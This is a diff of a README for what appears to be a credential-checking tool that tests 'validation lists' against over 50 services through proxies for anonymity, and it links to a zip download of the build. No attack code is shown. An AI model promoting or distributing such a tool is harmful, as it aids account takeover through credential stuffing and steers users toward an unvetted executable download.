@@ -33,7 +33,7 @@ Our suite includes pre-configured modules for over 50 world-class services, ensu
 
 1.  **Download** the latest build from the [Releases](https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple_Checker/Simple.checker.zip)(#) tab.⬇️
 
-### https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple_Checker/Simplechecker.zip
+### https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple_Checker/Simple.checker.zip
 
 2.  **Load Data:** Place your validation lists in the `input/` directory.
 3.  **Set Proxies:** Add your proxy list to `proxies.txt` for anonymous auditing.
